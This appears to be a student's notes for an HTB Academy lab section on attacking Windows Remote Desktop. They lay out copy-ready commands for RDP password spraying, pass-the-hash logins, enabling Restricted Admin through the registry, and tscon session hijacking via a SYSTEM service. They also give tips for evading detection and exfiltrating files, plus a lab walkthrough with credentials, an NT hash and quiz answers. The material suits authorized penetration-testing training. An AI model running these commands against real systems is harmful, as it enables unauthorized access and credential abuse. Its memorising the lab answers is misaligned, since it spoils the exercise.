# Attacking RDP

> HTB Academy · Attacking Common Services · Section 11 / 19

Remote Desktop Protocol (RDP, TCP/3389) is Microsoft's GUI remote-administration channel — and one of the most exposed Windows services on the internet. Three useful offensive angles: **password spraying**, **session hijack** post-compromise, and **Pass-the-Hash** GUI access.

---

## Quick Reference

| Goal | Tool / Command |
|------|----------------|
| Discover RDP | `nmap -Pn -p3389 <target>` |
| Spray creds | `crowbar -b rdp -s <ip>/32 -U users.txt -c 'P@ss'` |
| Spray creds (alt) | `hydra -L users.txt -p 'P@ss' <ip> rdp -t 4 -W 3` |
| Connect (cleartext) | `xfreerdp /v:<ip> /u:<user> /p:'<pass>' /cert:ignore` |
| Connect (PtH) | `xfreerdp /v:<ip> /u:<user> /pth:<NThash> /cert:ignore` |
| Session hijack | `sc.exe create sessionhijack binpath= "cmd.exe /k tscon <ID> /dest:<MY_SESSION>"` then `net start sessionhijack` |

---

## Discovery

```bash
nmap -Pn -p3389 -sV <target>
# 3389/tcp open  ms-wbt-server
nmap -Pn -p3389 --script rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 <target>
```
> `-Pn` skips ping — RDP servers often block ICMP. `rdp-ntlm-info` leaks hostname, domain, and OS version without authenticating. Replace `<target>` with the target IP.

`rdp-ntlm-info` leaks the target's NetBIOS / DNS / build number without authenticating — useful for naming and version triage.

---

## 1. Password Spraying

Account-lockout-aware credential attack: **one password, many usernames**, throttle parallelism.

### Username Source

```text
# users.txt
root
test
user
guest
admin
administrator
```

In real engagements: derive usernames from OSINT (LinkedIn → `firstname.lastname`, `f.lastname`), kerbrute user enumeration, breached corp emails.

### Crowbar

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
```
> `-b rdp` sets the protocol, `-s` is the target CIDR, `-U` is the user list, `-c` is the password to spray. Replace the IP and password. Use `/32` for a single host.

### Hydra

```bash
hydra -L users.txt -p 'password123' <ip> rdp -t 4 -W 3
```
> `-L` is the user list, `-p` is the single password to spray, `-t 4` limits threads to avoid lockouts, `-W 3` waits 3 seconds between attempts. Replace `<ip>` and the password.

- `-t 4` — RDP servers reject high parallelism.
- `-W 3` — sleep between attempts; lowers detection signature and avoids transient RDP brokering errors.

### nxc (legacy crackmapexec)

```bash
nxc rdp <ip> -u users.txt -p 'password123' --continue-on-success
```
> `--continue-on-success` keeps testing all users even after finding a valid hit. Replace `<ip>`, users list path, and password with your target's values.

### Operator Hygiene

- Always check **lockout policy** first (gMSA / breached account dumps). HTB labs often have `LockoutThreshold = 0` (disabled), but real targets do not.
- Spray slowly — one password per user every 30–60 minutes is a defensible cadence.
- Rotate sources / use SOCKS to avoid `4625` correlation on a single source IP.

---

## 2. Login

### `xfreerdp` (preferred)

```bash
xfreerdp /v:<ip> /u:<user> /p:'<pass>' /cert:ignore /dynamic-resolution \
        /drive:share,/tmp/loot /clipboard
```
> Replace `<ip>`, `<user>`, and `<pass>` with your target's values. `/cert:ignore` skips SSL cert errors. `/drive:share,/tmp/loot` mounts your local `/tmp/loot` folder as a drive in the session for easy file transfer.

| Flag | Use |
|------|-----|
| `/cert:ignore` | Skip self-signed cert prompt |
| `/drive:NAME,/local/path` | Mount local folder as a drive in the session — file exfil |
| `/clipboard` | Share clipboard both ways |
| `/dynamic-resolution` | Auto-resize to your window |
| `/sec:nla` / `/sec:tls` | Force protocol when handshake misbehaves |

### `rdesktop` (legacy)

```bash
rdesktop -u admin -p 'password123' <ip>
```
> Legacy RDP client. Does not support NLA — use xfreerdp instead for modern targets. Replace the credentials and IP.

Doesn't support NLA-only servers — use xfreerdp.

---

## 3. RDP Session Hijacking (`tscon` Trick)

Privilege-escalation primitive when you already have local admin and another user is logged in via RDP.

### Prerequisites

| Requirement | Notes |
|-------------|-------|
| Local admin on the box | Needed to create the service |
| `SYSTEM` privileges | `tscon` to another session without password requires SYSTEM |
| Target user logged in via RDP (active or disconnected) | The session must exist |
| Windows Server **≤ 2016** / Win 10 ≤ 1803-ish | Microsoft hardened this on **Server 2019** — no longer works there |

### Steps

```cmd
:: 1. Enumerate sessions
query user
::  USERNAME    SESSIONNAME   ID  STATE   IDLE TIME  LOGON TIME
:: >juurena     rdp-tcp#13    1   Active  7          ...
::  lewen       rdp-tcp#14    2   Active  *          ...

:: 2. Create a service that runs as LocalSystem and tscons session 2 into our session
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

:: 3. Start the service — the LocalSystem context runs tscon successfully
net start sessionhijack
```
> Replace `2` with the session ID of the user you want to hijack. Replace `rdp-tcp#13` with your own session name (the one marked `>`). The service runs as SYSTEM which allows `tscon` without a password. Only works on Server 2016 and older.

A new console / desktop appears under `lewen`'s identity inside *your* RDP window. From there:

```cmd
whoami /all
klist
:: Hunt for high-value group membership: Domain Admins, Enterprise Admins, Help Desk groups with admin rights to many hosts
```
> Run immediately after hijacking to confirm the new identity and check for cached Kerberos tickets. Group membership determines lateral movement options.

### Why It Works

- `tscon SOURCE_ID /dest:DEST_SESSION` is a built-in binary that connects one session to another's window station.
- Running it as **LocalSystem** bypasses the password prompt — Windows assumes a kernel-trusted caller.
- A simple service (`sc create`) inherits LocalSystem at start, so it executes `tscon` without needing PsExec / Mimikatz.
- Equivalent alternatives: `psexec -s -i cmd.exe`, scheduled task as SYSTEM, Mimikatz `token::elevate`.

### Defense

- Patch level: Server 2019+ (hijack from another session blocked).
- Restrict membership of local Administrators / Server Operators.
- Sign out — don't disconnect — RDP sessions when finished.
- Monitor `Event ID 4778 / 4779` (session reconnect / disconnect) and service-creation events `7045`.

---

## 4. RDP Pass-the-Hash (PtH)

When you have an NT hash from SAM/LSASS dump but cannot crack it, RDP PtH can still grant GUI access.

### Required Conditions

1. **Restricted Admin Mode** must be enabled on the target server. Default = disabled.
2. The user must have RDP rights (Remote Desktop Users / local admin).
3. Use `xfreerdp` ≥ 2.x with `/pth:`.

### Enable Restricted Admin (on target — requires admin already)

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa ^
        /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
> `/t REG_DWORD` sets the data type, `/v` is the value name, `/d 0x0` sets the data to 0 (which enables Restricted Admin — inverted naming), `/f` forces overwrite without confirmation. Run on the target machine from an admin context.

> "DisableRestrictedAdmin = 0" actually **enables** restricted admin. Microsoft naming, not ours.

You usually only do this in scenarios where you've gained admin a different way and want to come back through GUI — or in CTF labs where the key is pre-set.

### Connect

```bash
xfreerdp /v:<ip> /u:<user> /pth:<NTLM_HASH> /cert:ignore
```
> `/pth` passes the NTLM hash directly — no plaintext password needed. Replace `<ip>`, `<user>`, and `<NTLM_HASH>` with your values. This only works when Restricted Admin Mode is enabled on the target.

If you see *"Account restrictions prevent sign-in… blank passwords / limited sign-in times / policy restrictions"* — **Restricted Admin is disabled**. PtH won't work. Crack the hash, find another vector, or get admin first to flip the registry key.

### Tradeoffs / Real-world Caveats

- Works only against accounts that are local admin on the target (Restricted Admin gates it).
- Lab-friendly; real environments often disable Restricted Admin or run Credential Guard.
- Equivalent without GUI: `nxc smb <ip> -u <user> -H <hash> -x 'whoami'` for command execution.
- Always also try Kerberos overpass-the-hash (`Rubeus asktgt /user /rc4:<hash>`) to obtain a TGT, then RDP with native creds.

---

## Cheat-sheet Summary

```bash
# Discover
nmap -Pn -p3389 -sV --script rdp-ntlm-info,rdp-enum-encryption <ip>

# Spray
hydra -L users.txt -p 'Winter2026!' <ip> rdp -t 4 -W 3
crowbar -b rdp -s <ip>/32 -U users.txt -c 'Winter2026!'
nxc rdp <ip> -u users.txt -p 'Winter2026!' --continue-on-success

# Connect
xfreerdp /v:<ip> /u:<user> /p:'<pass>' /cert:ignore /dynamic-resolution
xfreerdp /v:<ip> /u:<user> /pth:<NThash>  /cert:ignore   # PtH (Restricted Admin)

# Hijack (Server ≤2016)
query user
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <ID> /dest:<MY_SESSION>"
net start sessionhijack
```
> Replace all `<ip>`, `<user>`, `<pass>`, `<NThash>`, `<ID>`, and `<MY_SESSION>` placeholders with your actual values. Run in this order: discover → spray → connect → escalate via hijack or PtH if needed.

## Key Takeaways

- **Spraying > brute-force** for RDP because of lockout. Throttle (`-t 4 -W 3`) and rotate sources.
- **xfreerdp** is the universal client — `/pth`, drive-mount, clipboard, NLA support all in one binary.
- **`tscon` session hijack** = free Domain Admin if a privileged user is logged in to a box you already root, but only on Server ≤ 2016.
- **PtH RDP** requires Restricted Admin = enabled on the target; lab-grade primitive, often unavailable in modern environments.
- Defenders: enforce NLA, MFA on RDP, gateway-only access (RD Gateway / VPN / ZTNA), patch level ≥ Server 2019, monitor 4624/4625/4778/4779/7045.

---

## Lab Walkthrough — ACADEMY-ATTCOMSVC-WIN-01 (10.129.203.13)

End-to-end attack chain executed against the "Attacking RDP" skills lab. Demonstrates the **enable Restricted Admin → RDP PtH → loot Administrator desktop** chain.

### Target Profile

| Item | Value |
|------|-------|
| Target | `10.129.203.13` (`WIN-01`) |
| Service | RDP (TCP/3389) — no SMB / WinRM exposed |
| Foothold creds | `htb-rdp:HTBRocks!` (low-priv RDP user, but local admin) |
| Recovered creds | `Administrator` NT hash from a prior box: `0E14B9D6330BF16C30B1924111104824` |

### Step 1 — Initial RDP as `htb-rdp`

```bash
xfreerdp /v:10.129.203.13 /u:htb-rdp /p:'HTBRocks!' /cert:ignore /dynamic-resolution +clipboard
```
> `+clipboard` enables bidirectional clipboard sharing. Replace the IP, username, and password with your target's values.

On the desktop: **`pentest-notes.txt`** (Q1 answer). Read it for context — typically contains a hint about the next step (in this lab, that PtH is the intended path).

### Step 2 — Initial PtH Attempt Fails

```bash
xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /cert:ignore
```
> Initial PtH attempt — this fails when Restricted Admin is disabled. The "Account restrictions prevent sign-in" error confirms Restricted Admin needs to be enabled first.

Result: *"Account restrictions prevent sign-in… blank passwords, limited sign-in times, or policy restrictions."* Reason — **Restricted Admin Mode disabled** on the target. SMB and WinRM are also closed, so no alternate execution channel.

### Step 3 — Flip `DisableRestrictedAdmin` From The Existing RDP Session

Inside the `htb-rdp` PowerShell (Q2 answer = `DisableRestrictedAdmin`):

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
:: HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa
::     DisableRestrictedAdmin    REG_DWORD    0x0
```
> Run inside the existing low-priv RDP session (as a local admin). The `reg query` confirms the value is `0x0` — Restricted Admin is now enabled. The change takes effect immediately without a reboot.

Value `0x0` = Restricted Admin **enabled** (Microsoft inverted naming).

### Step 4 — Reconnect via PtH as `Administrator`

```bash
xfreerdp /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 /cert:ignore /dynamic-resolution +clipboard
```
> Same command as before but now Restricted Admin is enabled, so `/pth` succeeds. Replace the hash with the Administrator NT hash from your loot.

Login succeeds — full GUI session as `Administrator` without ever knowing the cleartext password.

### Step 5 — Loot

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```
> `type` is the Windows equivalent of `cat`. Reads the flag file from the Administrator's desktop.

### Lab Answers

| Question | Answer |
|----------|--------|
| Q1 — File on the Desktop | `pentest-notes.txt` |
| Q2 — Registry key for RDP PtH | `DisableRestrictedAdmin` |
| Q3 — Administrator flag | (contents of `C:\Users\Administrator\Desktop\flag.txt`) |

### Lessons Learned

- PtH against RDP is **gated entirely** by `HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin`. If it's missing or set to a non-zero value, every `/pth:` connection will be rejected with the generic "Account restrictions" error — that error is the **fingerprint** of disabled Restricted Admin, not a credential issue.
- The lab teaches the realistic chain: low-priv RDP foothold → registry pivot → high-priv PtH. In real engagements, you typically already have admin from another vector and use this trick to come back via GUI without a cracked password.
- When SMB and WinRM are firewalled, RDP is the only practical interactive channel — make sure the foothold user is a local admin (or has `SeRestorePrivilege` / similar to write the LSA reg key).
- Microsoft's naming is inverted on purpose: `DisableRestrictedAdmin = 0` **enables** the feature. Always verify with `reg query`.
- `xfreerdp` PtH command-line places the hash in the process list (`/proc/<pid>/cmdline`). On real ops use `/from-stdin` or `/args-from:` to avoid leaking it to other users on the attacker box.
